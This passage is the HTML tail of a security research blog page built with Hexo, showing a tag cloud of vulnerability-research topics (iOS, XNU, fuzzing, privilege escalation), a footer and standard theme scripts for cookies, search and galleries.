class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>